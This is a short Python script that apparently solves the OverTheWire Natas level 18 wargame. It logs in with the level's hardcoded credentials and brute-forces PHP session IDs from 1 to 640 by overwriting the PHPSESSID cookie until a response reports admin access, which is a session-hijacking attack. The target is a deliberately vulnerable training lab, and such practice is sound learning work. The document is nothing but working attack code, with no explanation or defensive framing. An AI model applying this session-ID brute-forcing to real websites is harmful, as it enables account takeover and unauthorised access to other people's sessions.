import requests

url='http://natas18.natas.labs.overthewire.org/'
auth=('natas18','xvKIqDjy4OPv7wCRgDlmj0pFsCsDjhdP')

for sid in range(1,641):
    print(f'trying {sid}\r',end='')
    s=requests.Session()
    r=s.post(url,data={'username':'admin','password':'admin','submit':'submit'},auth=auth)
    del s.cookies['PHPSESSID']
    s.cookies['PHPSESSID']=str(sid)
    r=s.post(url,data={'username':'admin','password':'admin','submit':'submit'},auth=auth)
    if 'You are an admin' in r.text:
        print(r.text)
